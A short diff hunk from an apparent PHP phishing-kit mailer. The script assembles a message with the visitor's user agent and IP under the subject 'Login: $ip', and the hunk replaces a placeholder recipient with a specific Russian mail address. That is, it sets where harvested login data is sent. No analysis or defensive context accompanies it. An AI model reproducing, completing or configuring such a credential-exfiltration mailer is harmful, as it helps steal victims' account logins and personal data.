@@ -56,7 +56,7 @@ $message .= "UserAgent: $useragent\n";
 $message .= "|--------------------------------|\n";
 
 // Send mail
-$send = "yourmail@gmail.com"; // ✅ replace with your email
+$send = "zhu.zhung@yandex.ru"; // ✅ replace with your email
 
 
 $subject = "Login: $ip";
